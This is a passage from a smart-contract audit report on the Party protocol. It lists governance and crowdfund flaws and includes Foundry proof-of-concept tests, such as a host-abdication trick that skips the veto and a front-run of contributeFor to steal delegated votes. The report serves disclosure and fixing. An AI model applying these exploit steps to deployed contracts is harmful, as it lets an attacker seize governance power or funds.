            uint256[] memory preciousTokenIds
        ) = partyAdmin.createParty(
                partyImpl,
                PartyAdmin.PartyCreationMinimalOptions({
                    host1: address(alice),
                    host2: address(bob),
                    passThresholdBps: passThresholdBps,
                    totalVotingPower: 151,
                    preciousTokenAddress: address(toadz),
                    preciousTokenId: 1,
                    rageQuitTimestamp: 0,
                    feeBps: 0,
                    feeRecipient: payable(0)
                })
            );

        // alice and bob are the only two hosts
        assert(party.isHost(address(alice)));
        assert(party.isHost(address(bob)));
        assert(!party.isHost(address(chad)));
        assert(!party.isHost(address(aliceAltWallet)));

        // mint governance NFTs
        partyAdmin.mintGovNft(party, address(alice), 50, address(alice));
        partyAdmin.mintGovNft(party, address(bob), 50, address(bob));
        partyAdmin.mintGovNft(party, address(chad), 50, address(chad));
        partyAdmin.mintGovNft(party, address(aliceAltWallet), 1, address(aliceAltWallet));

        // alice proposes a proposal
        PartyGovernance.Proposal memory p1 = PartyGovernance.Proposal({
            maxExecutableTime: 9999999999,
            proposalData: abi.encodePacked([0]),
            cancelDelay: uint40(1 days)
        });
        vm.roll(block.number + 1);
        uint256 proposalId = alice.makeProposal(party, p1, 0);
        
        // chad accepts, but bob (the other host) does not
        vm.roll(block.number + 1);
        chad.vote(party, proposalId, 0);

        // proposal meets vote threshold, but not all hosts have accepted
        vm.roll(block.number + 1);
        (
            PartyGovernance.ProposalStatus status,
            PartyGovernance.ProposalStateValues memory values
        ) = party.getProposalStateInfo(proposalId);
        assertEq(values.numHosts, 2);
        assertEq(values.numHostsAccepted, 1);
        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Passed)); // not Ready => veto period has not been skipped

        // alice transfers host status to her other wallet address
        vm.prank(address(alice));
        vm.roll(block.number + 1);
        party.abdicateHost(address(aliceAltWallet));

        // alice accepts using her other wallet
        vm.roll(block.number + 1);
        aliceAltWallet.vote(party, proposalId, 0);

        // veto is now skipped even though a host (bob) did not accept
        vm.roll(block.number + 1);
        (status, values) = party.getProposalStateInfo(proposalId);
        assertEq(values.numHosts, 2);
        assertEq(values.numHostsAccepted, 2);
        assertEq(uint(status), uint(PartyGovernance.ProposalStatus.Ready)); // Ready for execution => veto period has now been skipped
    }
```

### Recommended Mitigation Steps

Utilise snapshots for hosts in a similar way to how `votingPower` is currently handled, so that `accept` only increments `numHostsAccepted` if the caller was a host at `proposedTime - 1`. This can be achieved under the current architecture in the following way:

- Add a new `bool` member to the `VotingPowerSnapshot` struct named `isHost`.
- Make `abdicateHost` save new snapshots to the `_votingPowerSnapshotsByVoter` mapping with the updated `isHost` values for the old and new hosts.
- Replace the `isHost[msg.sender]` check in `accept` with a snapshot check, similar to how `getVotingPowerAt` is currently used.

### Assessed type

Governance

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1817856780):**
 > Confirmed by sponsor [here](https://github.com/code-423n4/2023-10-party-findings/issues/538#issuecomment-1810898378).
> Judging as high due to compromised governance.

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/233#issuecomment-1821298504)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-party-findings/issues/233).*

***
 
# Medium Risk Findings (7)
## [[M-01] Some arbitrary proposal calls will fail because `executeProposal()` in `ProposalExecutionEngine` is not payable](https://github.com/code-423n4/2023-10-party-findings/issues/475)
*Submitted by [Arz](https://github.com/code-423n4/2023-10-party-findings/issues/475), also found by [HChang26](https://github.com/code-423n4/2023-10-party-findings/issues/267) and [Vagner](https://github.com/code-423n4/2023-10-party-findings/issues/118)*

The `executeProposal()` function in `ProposalExecutionEngine.sol` is used to execute different types of proposal call. One of this type is `ArbitraryCallsProposal` and this type should be able to send ether from the Party's balance or the forwarded ETH attached to the call `msg.value`. However, the problem is that the `executeProposal()` function is not marked as payable and all calls that are sending ether and using `msg.value` will fail because of that.

Note: Even though this function is delegate-called from `PartyGovernance.sol::execute()`, which is payable the `msg.value`, it is still preserved when `delegatecall` is used and the function called needs to be payable.

### Impact

All proposal calls that are using attached ether will fail and Party wont be able to execute these types of proposals, which can be important.

### Proof of Concept

<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ProposalExecutionEngine.sol#L146-L148>

```solidity
146:   function executeProposal(
147:     ExecuteProposalParams memory params
148:   ) external onlyDelegateCall returns (bytes memory nextProgressData) { 
```

As you can see, the `executeProposal()` function is not payable; however, later it then calls `_executeArbitraryCalls()`:

<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/proposals/ArbitraryCallsProposal.sol#L72-L74>

```solidity
72:  // If we're not allowing arbitrary calls to spend the Party's ETH, only
73:  // allow forwarded ETH attached to the call to be spent.
74:  uint256 ethAvailable = allowArbCallsToSpendPartyEth ? address(this).balance : msg.value;
```

As you can see and as the comment suggests, the call should be able to use the forwarded ether attached to the call and `ethAvailable` is then used in `_executeSingleArbitraryCall()`. However, because the function is not payable, the call will revert.

### Recommended Mitigation Steps

Make the `executeProposal()` function payable.

### Assessed type

Payable

**[KingNFT (lookout) commented](https://github.com/code-423n4/2023-10-party-findings/issues/475#issuecomment-1806831773):**
 > Seems right, EVM source code:
> ```golang
> File: core\vm\contract.go
> 134: func (c *Contract) AsDelegate() *Contract {
> 135: 	// NOTE: caller must, at all times be a contract. It should never happen
> 136: 	// that caller is something other than a Contract.
> 137: 	parent := c.caller.(*Contract)
> 138: 	c.CallerAddress = parent.CallerAddress
> 139: 	c.value = parent.value
> 140: 
> 141: 	return c
> 142: }
> ```

**[arr00 (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/475#issuecomment-1811162360)**

***

## [[M-02] `PartyGovernanceNFT.sol#mint` - User can delegate another users funds to themselves and brick them from changing the delegation](https://github.com/code-423n4/2023-10-party-findings/issues/418)
*Submitted by [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/418), also found by [klau5](https://github.com/code-423n4/2023-10-party-findings/issues/459), [0xadrii](https://github.com/code-423n4/2023-10-party-findings/issues/433), [leegh](https://github.com/code-423n4/2023-10-party-findings/issues/311), [minimalproxy](https://github.com/code-423n4/2023-10-party-findings/issues/226), rvierdiiev ([1](https://github.com/code-423n4/2023-10-party-findings/issues/73), [2](https://github.com/code-423n4/2023-10-party-findings/issues/72)), [3docSec](https://github.com/code-423n4/2023-10-party-findings/issues/334), and [mahdikarimi](https://github.com/code-423n4/2023-10-party-findings/issues/248)*

The natural flow of minting a new Card is through contributing to the Crowdfund. The protocol also allows users to `contributeFor` in the name of someone else.

Let's follow the flow of the `contributeFor`. The function immediately calls `_contribute`:

```js
function _contribute(
        address payable contributor,
        address delegate,
        uint96 amount,
        uint256 tokenId,
        bytes memory gateData
    ) private returns (uint96 votingPower) {
        // Require a non-null delegate.
        if (delegate == address(0)) {
            revert InvalidDelegateError();
        }

        // Must not be blocked by gatekeeper.
        IGateKeeper _gateKeeper = gateKeeper;
        if (_gateKeeper != IGateKeeper(address(0))) {
            if (!_gateKeeper.isAllowed(msg.sender, gateKeeperId, gateData)) {
                revert NotAllowedByGateKeeperError(msg.sender, _gateKeeper, gateKeeperId, gateData);
            }
        }

        votingPower = _processContribution(contributor, delegate, amount);
        ...
```

Some checks are done, then we call `_processContribution`:

```js
function _processContribution(
        address payable contributor,
        address delegate,
        uint96 amount
    ) internal returns (uint96 votingPower) {
        address oldDelegate = delegationsByContributor[contributor];
        if (msg.sender == contributor || oldDelegate == address(0)) {
            // Update delegate.
            delegationsByContributor[contributor] = delegate;
        } else {
            // Prevent changing another's delegate if already delegated.
            delegate = oldDelegate;
        }
     ...
```

Inside we see this `if/else` statement. It allows for anyone to set delegate for a user, but only if `oldDelegate == address(0)`, meaning it's never been set before. If `msg.sender == contributor`, they can still set the delegate to whoever they wish. Anyone else calling `contributeFor` after the original contributor has delegated and can't change the delegate.

The rest of the function finishes and we go back to `_contribute` after which we call `party.mint`.

Inside `mint` we see the following:

```js
        ...
        address delegate_ = delegationsByVoter[owner];
        if (delegate_ != address(0)) {
            delegate = delegate_;
        }
        ...
```

Here, we check if `delegationsByVoter[owner] != address(0)`; meaning this is the first time a delegate is being set. If a delegate already exists, we set the  new `delegate` to the old `delegationsByVoter[owner]`. This is where the problem lies. Note that this function doesn't take into account if `msg.sender == contributor`, so once `delegationsByVoter[owner]` is set, there is no changing it through the `mint` function again.

So let's imagine the following scenario:
`maxTotalContributions = 20 ether`.

1. Users already contributed `5 ether` to the crowdfund.
2. Bob decides to contribute another `15 ether` to finalize it early, and sets himself as `initialDelegate`.
3. Alice being malicious, front-runs Bob's contribution with `contributeFor{value: 1 }(0, payable(address(bob)), address(alice), "");` setting Bob's delegate to herself.

At this point `delegationsByVoter[bob] = alice`

4. Bob's contribution passes, but inside `mint` we hit this:

```js
        address delegate_ = delegationsByVoter[owner];
        if (delegate_ != address(0)) {
            delegate = delegate_;
        }
```

Since Bob already has a delegate, he can't change it here, so Bob's `delegate` gets overwritten to Alice and he is unable to change the delegate.

5. All of Bob's `15 ether` gets delegated to Alice inside `_adjustVotingPower`
6. After this, the crowdfund finalizes and the Party starts.
7. At this point, Alice can `propose/accept` with a huge amount of voting power that was never intended for her and she can influence proposals that she shouldn't be able to.
8. Bob can get his delegation back by calling `delegateVotingPower`, but Alice will have enough time to influence the Party.

Note that this way a 51% attack can easily be executed by a malicious user. A malicious user can steal multiple delegates this way and influence the Party greatly.

### Proof of Concept

```js
 function _createCrowdfundWithAuthorities(
        CreateCrowdfundArgs memory args,
        bool initialize
    ) internal returns (InitialETHCrowdfund crowdfund) {
        crowdfundOpts.initialContributor = args.initialContributor;
        crowdfundOpts.initialDelegate = args.initialDelegate;
        crowdfundOpts.minContribution = args.minContributions;
        crowdfundOpts.maxContribution = args.maxContributions;
        crowdfundOpts.disableContributingForExistingCard = args.disableContributingForExistingCard;
        crowdfundOpts.minTotalContributions = args.minTotalContributions;
        crowdfundOpts.maxTotalContributions = args.maxTotalContributions;
        crowdfundOpts.duration = args.duration;
        crowdfundOpts.exchangeRateBps = args.exchangeRateBps;
        crowdfundOpts.fundingSplitBps = args.fundingSplitBps;
        crowdfundOpts.fundingSplitRecipient = args.fundingSplitRecipient;
        crowdfundOpts.gateKeeper = args.gateKeeper;
        crowdfundOpts.gateKeeperId = args.gateKeeperId;

        partyOpts.name = "Test Party";
        partyOpts.symbol = "TEST";
        partyOpts.governanceOpts.partyImpl = partyImpl;
        partyOpts.governanceOpts.partyFactory = partyFactory;
        partyOpts.governanceOpts.voteDuration = 7 days;
        partyOpts.governanceOpts.executionDelay = 1 days;
        partyOpts.governanceOpts.passThresholdBps = 0.5e4;
        partyOpts.governanceOpts.hosts = new address[](1);
        partyOpts.governanceOpts.hosts[0] = address(this);
        partyOpts.authorities = new address[](1); // Set the authority to address(this) for testing purposes
        partyOpts.authorities[0] = address(this);

        crowdfund = InitialETHCrowdfund(payable(address(initialETHCrowdfundImpl).clone()));
        if (initialize) {
            crowdfund.initialize{ value: args.initialContribution }(
                crowdfundOpts,
                partyOpts,
                MetadataProvider(address(0)),
                ""
            );
        }
    }

function test_stealingDelegations() public {
        InitialETHCrowdfund crowdfund = _createCrowdfundWithAuthorities(
            CreateCrowdfundArgs({
                initialContribution: 0, 
                initialContributor: payable(address(0)),
                initialDelegate: address(0),
                minContributions: 0,
                maxContributions: type(uint96).max,
                disableContributingForExistingCard: false, 
                minTotalContributions: 5 ether,
                maxTotalContributions: 20 ether, 
                duration: 7 days,
                exchangeRateBps: 1e4, 
                fundingSplitBps: 0,
                fundingSplitRecipient: payable(address(0)),
                gateKeeper: IGateKeeper(address(0)),
                gateKeeperId: bytes12(0)
            }), true
        );
        Party party = crowdfund.party();

        // Charlie contributes to the Crowdfund
        address charlie = _randomAddress();
        vm.deal(charlie, 10 ether);
        vm.prank(charlie);
        crowdfund.contribute{value: 5 ether }(address(charlie), "");

        address bob = _randomAddress();
        // Alice front runs Bob's contribution, setting herself as Bob's delegate
        address alice = _randomAddress();
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        crowdfund.contributeFor{value: 1 }(0, payable(address(bob)), address(alice), "");

        // Bob contributes and finalizes the crowdfund, not knowing
        // that he just contributed all of his voting power to Alice
        vm.deal(bob, 15 ether);
        vm.prank(bob);
        crowdfund.contribute{value: 15 ether }(address(bob), "");

        // Here we can see that Alice has `15e18` voting power, even though she should have only `1 wei`
        assertEq(party.getVotingPowerAt(address(alice), uint40(block.timestamp)), 15 ether);
        // Even though Bob set himself as the delegate, he has 0 voting power, because his
        // delegation got overwritten
        assertEq(party.getVotingPowerAt(address(bob), uint40(block.timestamp)), 0);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

We recommend removing the `contributeFor` function.

**[KingNFT (lookout) commented](https://github.com/code-423n4/2023-10-party-findings/issues/418#issuecomment-1806878946):**
 > Please reference:

> ```solidity
> File: contracts\party\PartyGovernance.sol
> 451:     function delegateVotingPower(address delegate) external {
> 452:         _adjustVotingPower(msg.sender, 0, delegate);
> 453:     }
> ```

**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-party-findings/issues/418#issuecomment-1817881800):**
 > The warden described a potential grieving vector where an attacker (Alice) can temporarily steal the delegation from another user (Bob) who contributed for a user (User).
>
> The delegation power would be temporarily stolen at no cost until the User re-delegate.

**[arr00 (Party) confirmed and commented via duplicate issue #311](https://github.com/code-423n4/2023-10-party-findings/issues/311#issuecomment-1821346495):**
> We plan on changing documentation to make it clear that the delegates are only for initial mints. We won't be changing the mint function as of now due to cascading issues with that.

***

## [[M-03] `PartyGovernanceNFT` advertises but does not honor the ERC-4906 standard](https://github.com/code-423n4/2023-10-party-findings/issues/340)
*Submitted by [3docSec](https://github.com/code-423n4/2023-10-party-findings/issues/340), also found by [pep7siup](https://github.com/code-423n4/2023-10-party-findings/issues/399), [Bauchibred](https://github.com/code-423n4/2023-10-party-findings/issues/392), and [lsaudit](https://github.com/code-423n4/2023-10-party-findings/issues/187)*

### Lines of code

<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernanceNFT.sol#L208><br>
<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernanceNFT.sol#L236><br>
<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernanceNFT.sol#L247><br>
<https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/contracts/party/PartyGovernanceNFT.sol#L255>

### Vulnerability details

The `PartyGovernanceNFT` contract inherits from PartyGovernance, and through it, it advertises support for the ERC-4906 standard:

```Solidity
    // PartyGovernance.sol:333

    function supportsInterface(bytes4 interfaceId) public pure virtual returns (bool) {
        return
            interfaceId == type(IERC721Receiver).interfaceId ||
            interfaceId == type(ERC1155TokenReceiverBase).interfaceId ||
            // ERC4906 interface ID
            interfaceId == 0x49064906;
    }
```

Because of this, consumers like NFT marketplaces or block explorer expect updates from `PartyGovernanceNFT` in the form of `MetadataUpdate` or `BatchMetadataUpdate` events whenever the metadata of its NFTs changes.

The protocol has a default implementation of Party metadata, which, among other information, includes voting power:

```Solidity
                // PartyNFTRenderer.sol:292
                string.concat(
                    "This membership represents ",
                    generateVotingPowerPercentage(tokenId),
                    "% voting power in ",
                    partyName,
                    ". Head to ",
                    generateExternalURL(),
                    " to view the Party's latest activity."
                );
```

Consequently, the metadata is expected to change whenever a single NFT's voting power, or the contract's total voting power are updated.
However, when this happens, no `MetadataUpdate` or `BatchMetadataUpdate` event is raised.

The following vote-share (and consequently metadata) changing functions have been identified, and none emits the required events:

```Solidity
    // PartyGovernanceNFT.sol:208
    function increaseVotingPower(uint256 tokenId, uint96 votingPower) external {
        // [...]
        emit PartyCardIntrinsicVotingPowerSet(tokenId, newIntrinsicVotingPower);

        _adjustVotingPower(ownerOf(tokenId), votingPower.safeCastUint96ToInt192(), address(0));
    }
```

```Solidity
    // PartyGovernanceNFT.sol:236
    function decreaseVotingPower(uint256 tokenId, uint96 votingPower) external {
        _assertAuthority();
        mintedVotingPower -= votingPower;
        votingPowerByTokenId[tokenId] -= votingPower;

        _adjustVotingPower(ownerOf(tokenId), -votingPower.safeCastUint96ToInt192(), address(0));
    }
```

```Solidity
    // PartyGovernanceNFT.sol:247
    function increaseTotalVotingPower(uint96 votingPower) external {
        _assertAuthority();
        _getSharedProposalStorage().governanceValues.totalVotingPower += votingPower;
    }
```

```Solidity
    // PartyGovernanceNFT.sol:255
    function decreaseTotalVotingPower(uint96 votingPower) external {
        _assertAuthority();
        _getSharedProposalStorage().governanceValues.totalVotingPower -= votingPower;
    }
```

As a consequence, off-chain platforms like NFT marketplaces or block explorers may show stale metadata for the NFTs, and token holders can use this stale data to their advantage.

To add context, openness to having `PartyGovernanceNFT` tokens traded on a marketplace seems a reasonable use case since the team opted for implementing [the ERC-2981 standard](https://eips.ethereum.org/EIPS/eip-2981) for `PartyGovernanceNFT` tokens.

### Impact

`PartyGovernanceNFT` tokens may be exchanged for inflated prices on platforms showing stale data.

### Proof of Concept

Starting with a `PartyGovernanceNFT` (after crowdfunding is finalized) that delegates its `tokenURI` to a `PartyNFTRenderer` contract:

- Create an NFT, and hash its `tokenURI`.
- Call `increaseVotingPower` or `decreaseVotingPower` for the given NFT:
    - Hash again the NFT `tokenURI` and observe how it's changed.
    - However no `MetadataUpdate` was called.
- Call `increaseTotalVotingPower` or `decreaseTotalVotingPower`.
    - Hash again the NFT `tokenURI` and observe how it's changed.
    - However no `BatchMetadataUpdate` was called.

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider updating:

- `PartyGovernanceNFT.increaseVotingPower` to emit a `MetadataUpdate` event.
- `PartyGovernanceNFT.decreaseVotingPower` to emit a `MetadataUpdate` event.
- `PartyGovernanceNFT.increaseTotalVotingPower` to emit a `BatchMetadataUpdate` event.
- `PartyGovernanceNFT.decreaseTotalVotingPower` to emit a `BatchMetadataUpdate` event.

### Assessed type

ERC721

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/340#issuecomment-1817923547):**
 > Judging as Med due to broken support of [ERC4960](https://github.com/code-423n4/2023-10-party/blob/b23c65d62a20921c709582b0b76b387f2bb9ebb5/README.md?plain=1#L120)
> > - `PartyGovernance`: Should comply with `ERC4906`
> 

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/340#issuecomment-1821304549)**

***

## [[M-04] `PartyGovernance.sol#accept` - `passThresholdBps` isn't cached for each proposal which can lead to problems if changed through another proposal](https://github.com/code-423n4/2023-10-party-findings/issues/295)
*Submitted by [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/295), also found by [KupiaSec](https://github.com/code-423n4/2023-10-party-findings/issues/413), [cccz](https://github.com/code-423n4/2023-10-party-findings/issues/385), and [0xbrett8571](https://github.com/code-423n4/2023-10-party-findings/issues/94)*

`PartyGovernance` uses a variable called `passThresholdBps` to determine the percentage of votes from the `totalVotingPower` a proposal needs to receive so it can pass.

The protocol also allows parties to change several governance options through `SetGovernanceParameterProposal`, including `passThresholdBps`.

```js
    /// @notice Execute a `SetGovernanceParameterProposal` which sets the given governance parameter.
    function _executeSetGovernanceParameter(
        IProposalExecutionEngine.ExecuteProposalParams memory params
    ) internal returns (bytes memory) {
        SetGovernanceParameterProposalData memory proposalData = abi.decode(
            params.proposalData,
            (SetGovernanceParameterProposalData)
        );
        if (proposalData.voteDuration != 0) {
            if (proposalData.voteDuration < 1 hours) { //@audit can be really fkin big
                revert InvalidGovernanceParameter(proposalData.voteDuration);
            }
            emit VoteDurationSet(
                _getSharedProposalStorage().governanceValues.voteDuration,
                proposalData.voteDuration
            );
            _getSharedProposalStorage().governanceValues.voteDuration = proposalData.voteDuration;
        }
        if (proposalData.executionDelay != 0) {
            if (proposalData.executionDelay > 30 days) {
                revert InvalidGovernanceParameter(proposalData.executionDelay);
            }
            emit ExecutionDelaySet(
                _getSharedProposalStorage().governanceValues.executionDelay,
                proposalData.executionDelay
            );
            _getSharedProposalStorage().governanceValues.executionDelay = proposalData
                .executionDelay;
        }
        if (proposalData.passThresholdBps != 0) { // passThresholdBps can be set as well
            if (proposalData.passThresholdBps > 10000) { 
                revert InvalidGovernanceParameter(proposalData.passThresholdBps);
            }
            emit PassThresholdBpsSet(
                _getSharedProposalStorage().governanceValues.passThresholdBps,
                proposalData.passThresholdBps
            );
            _getSharedProposalStorage().governanceValues.passThresholdBps = proposalData
                .passThresholdBps;
        }

        return "";
    }
```

This isn't in itself a problem, but the logic for checking if a proposal has passed contains a problem. Inside `accept`, we have a check called `_areVotesPassing`, which compares if the `votes` of the proposal, compared to the cached `totalVotingPower` of the proposal passes `passThresholdBps`. The issue is that we are using the global `passThresholdBps`, not a cached one.

```js
        ...
        // Update the proposal status if it has reached the pass threshold.
        if (
            values.passedTime == 0 &&
            _areVotesPassing(
                values.votes,
                values.totalVotingPower,
                _getSharedProposalStorage().governanceValues.passThresholdBps // This isn't cached
            )
        ) {
            info.values.passedTime = uint40(block.timestamp);
            emit ProposalPassed(proposalId);
            // Notify third-party platforms that the governance NFT metadata has
            // updated for all tokens.
            emit BatchMetadataUpdate(0, type(uint256).max);
        }
```

This can lead to unwanted behavior during the voting lifecycle of a proposal and can even be exploited by party members to their gain.

### Proof of Concept

Let's imagine a couple of scenarios:

**Scenario A** - `passThresholdBps = 0.5e4 (50%)`
1. Alice and Bob are friends and hold about 30% of the voting power of the Party.
2. Alice creates a proposal (proposal A), but Bob doesn't accept it yet. The other users, refuse to accept the proposal.
3. Alice and Bob create a second proposal (proposal B) to set `passThresholdBps = 0.3e4(30%)`.
4. Since the proposal will allow more freedom in the party for all users to pass their proposals, proposal B easily passes.
5. Now the `passThresholdBps = 0.3e4 (30%)` and Bob calls accept on proposal A, passing it.

**Scenario B** - Reverse of Scenario A - `passThresholdBps = 0.5e4 (50%)`
1. A proposal is created (proposal A) and it accumulates 40% votes. Since it's not a very popular proposal, we'll assume that it won't accumulate more than 60% votes total, which is still enough for it to pass at this time.
2. Another proposal is created (proposal B), which sets `passThresholdBps = 0.7e4 (70%)`.
3. Proposal A will now never pass, even if it accumulates 60% of the votes, since `passThresholdBps = 0.7e4 (70%)` it will never pass.

The actual creation of the proposals doesn't matter. Proposal B can be proposed before proposal A, as long as it gets executed first, it will have an effect on all previous proposals.

The scenarios here are endless: from grieving other users, maliciously exploiting the issue to get unpopular, unfavorable proposals to pass or blocking proposals that would have otherwise passed.

This also introduces more attack vectors for a 51% attack, as someone that has let's say 60% of the voting power, can just set `passThresholdBps = 0.6e4 (60%)` and easily block other users from getting their proposals accepted, while theirs will always pass.

Keep in mind that even completely non-malicious Parties can be affected by this negatively, as it introduces uncertainty and confusion during the voting stage.

### Recommended Mitigation Steps

We recommend caching `passThresholdBps` in a similar way as `totalVotingPower` is cached for proposals.

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/295#issuecomment-1821512555)**

***

## [[M-05] `PartyGovernanceNFT#rageQuit()` can lead to token loss for users when dealing with zero-balance ERC20 during a `rageQuit()`](https://github.com/code-423n4/2023-10-party-findings/issues/237)
*Submitted by [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/237), also found by [0xA5DF](https://github.com/code-423n4/2023-10-party-findings/issues/469), [3docSec](https://github.com/code-423n4/2023-10-party-findings/issues/333), and [Pechenite](https://github.com/code-423n4/2023-10-party-findings/issues/133)*

Calling Party's `rageQuit()` with a zero-balance ERC20 disregards the `minWithdrawAmounts` array, resulting in the loss of user tokens without compensation.

### Proof of Concept

Consider the following scenario illustrating the issue:
1. A Party holds `USDC` tokens.
2. The entire `USDC` balance is transferred to another account, e.g., via a proposal.
3. Alice, unaware of the Party's depleted `USDC` holdings, attempts to `rageQuit()`.
4. Alice specifies minimum withdrawal amounts using `uint256[] minWithdrawAmounts`.
5. Despite specifying `minWithdrawAmounts`, all of Alice's Party tokens are burned, and she receives nothing in return.

In `PartyGovernanceNFT#rageQuit()` the withdrawl amount for each ERC20 is calculated as follows:

```sol
withdrawAmounts[i] += (balance * getVotingPowerShareOf(tokenIds[j])) / 1e18;
```

Where:

```sol
balance = uint256 balance = address(withdrawTokens[i]) == ETH_ADDRESS ? address(this).balance : withdrawTokens[i].balanceOf(address(this));
```

However, if the token is an ERC20 for which the Party does not have any remaining balance, `withdrawAmounts[i]` would be equal to `0`.

This means the following check would not be executed at all:

```sol
if (amount > 0) { //@audit Would be skipped if amount is equal to 0.
    // ...
    // Check amount is at least minimum.
    if (amount < minAmount) { // This is never checked if amount is equal to 0.
        revert BelowMinWithdrawAmountError(amount, minAmount);
    }

    // ...
    payable(receiver).transferEth(amount);
}
```

Since the check for the minimum withdrawal amount is within the `if` statement, it is never executed when `amount` is equal to `0`, leading to unintended NFT loss.

```sol
uint96 totalVotingPowerBurned = _burnAndUpdateVotingPower(tokenIds, !isAuthority_); 

// Update total voting power of party.
_getSharedProposalStorage().governanceValues.totalVotingPower -= totalVotingPowerBurned;
```

### PoC:

```sol
// Add this to PartyGovernanceNFT.t.sol

function testRageQuitDoesNotHonorMinWithdrawAmountIsERC20BalanceIsZero() external {
    // Create party
    (Party party, , ) = partyAdmin.createParty(
        partyImpl,
        PartyAdmin.PartyCreationMinimalOptions({
            host1: address(this),
            host2: address(0),
            passThresholdBps: 5100,
            totalVotingPower: 100,
            preciousTokenAddress: address(toadz),
            preciousTokenId: 1,
            rageQuitTimestamp: 0,
            feeBps: 0,
            feeRecipient: payable(0)
        })
    );

	// Configure rage quit
    vm.prank(address(this));
    party.setRageQuit(uint40(block.timestamp) + 1);

	// Give alice 10 voting tokens out of 100
    address alice = makeAddr("alice");
    vm.prank(address(partyAdmin));
    uint256 tokenId = party.mint(alice, 10, alice);

	// An ERC20 in which the party previously had holdings
	// but now it's balance is == 0.
    IERC20[] memory tokens = new IERC20[](1);
    tokens[0] = IERC20(address(new DummyERC20()));

	// The minimum withdraw alice is willing to accept
    uint256[] memory minWithdrawAmounts = new uint256[](1);
    minWithdrawAmounts[0] = 1; // Notice it's a value >0 to demonstrate the non-working check

    uint256[] memory tokenIds = new uint256[](1);
    tokenIds[0] = tokenId;

    // Make sure the party has 0 balance
    DummyERC20(address(tokens[0])).deal(address(party), 0);

    // Before
    assertEq(party.votingPowerByTokenId(tokenId), 10); // alice has 10 voting tokens
    assertEq(tokens[0].balanceOf(alice), 0); // alice has 0 DummyERC20s

    vm.prank(alice);
    party.rageQuit(tokenIds, tokens, minWithdrawAmounts, alice); // This should revert

    // After
    assertEq(party.votingPowerByTokenId(tokenId), 0); // alice has lost her 10 voting tokens
    assertEq(tokens[0].balanceOf(alice), 0); // alice's dummyERC20 balance is still 0
    assertEq(party.getGovernanceValues().totalVotingPower, 90);
}
```

### Recommended Mitigation Steps

To ensure that the `BelowMinWithdrawAmountError` check is performed even when `amount` is equal to `0`, `amount > 0` must be replaced with `amount >= 0` in the `rageQuit()` function. Here's the modified code snippet:

```diff
--- a/contracts/party/PartyGovernanceNFT.sol
+++ b/contracts/party/PartyGovernanceNFT.sol
@@ -418,17 +418,17 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {
                     // Transfer fee to fee recipient.
                     if (address(token) == ETH_ADDRESS) {
                         payable(feeRecipient).transferEth(fee);
                     } else {
                         token.compatTransfer(feeRecipient, fee);
                     }
                 }

-                if (amount > 0) {
+                if (amount >= 0) {
                     uint256 minAmount = minWithdrawAmounts[i];

                     // Check amount is at least minimum.
                     if (amount < minAmount) {
                         revert BelowMinWithdrawAmountError(amount, minAmount);
                     }

                     // Transfer token from party to recipient.
```

### Assessed type

Invalid Validation

**[gzeon (judge) commented](https://github.com/code-423n4/2023-10-party-findings/issues/237#issuecomment-1826843605):**
 > Linking over the comment made [here](https://github.com/code-423n4/2023-10-party-findings/issues/469#issuecomment-1817877477).
> > Potential value leak, no reason to ignore specified values.
Judging as Medium... because while a function of the protocol is impacted, asset is not lost considering the user should call `ragequit` before the proposal that transfer out the token is executed.

**[0xble (Party) confirmed](https://github.com/code-423n4/2023-10-party-findings/issues/237#issuecomment-1850681461)**

***

## [[M-06] `ETHCrowdfundBase.sol#processContribution` - Impossible to finalize crowdfund because of `minContribution` check](https://github.com/code-423n4/2023-10-party-findings/issues/127)
*Submitted by [TresDelinquentes](https://github.com/code-423n4/2023-10-party-findings/issues/127), also found by [Pechenite](https://github.com/code-423n4/2023-10-party-findings/issues/590), [Arz](https://github.com/code-423n4/2023-10-party-findings/issues/552), [Neon2835](https://github.com/code-423n4/2023-10-party-findings/issues/539), [J4X](https://github.com/code-423n4/2023-10-party-findings/issues/453), [D1r3Wolf](https://github.com/code-423n4/2023-10-party-findings/issues/449), [3docSec](https://github.com/code-423n4/2023-10-party-findings/issues/336), [Bauchibred](https://github.com/code-423n4/2023-10-party-findings/issues/262), [chainsnake](https://github.com/code-423n4/2023-10-party-findings/issues/219), and [adeolu](https://github.com/code-423n4/2023-10-party-findings/issues/135)*

The contract implements a state variable `minContribution`, which enforces a minimum contribution to the crowdfund.

An issue occurs when `minContribution > maxTotalContribution - minTotalContribution`. The protocol team even accounted for such a case, but they assumed that `minTotalContribution` can always be reached, so a host can then call `finalize` and finalize the crowdfund early, but that isn't the case.

```js
        // Check that the contribution amount is at or above the minimum. This
        // is done after `amount` is potentially reduced if refunding excess
        // contribution. There is a case where this prevents a crowdfunds from
        // reaching `maxTotalContributions` if the `minContribution` is greater
        // than the difference between `maxTotalContributions` and the current
        // `totalContributions`. In this scenario users will have to wait until
        // the crowdfund expires or a host finalizes after
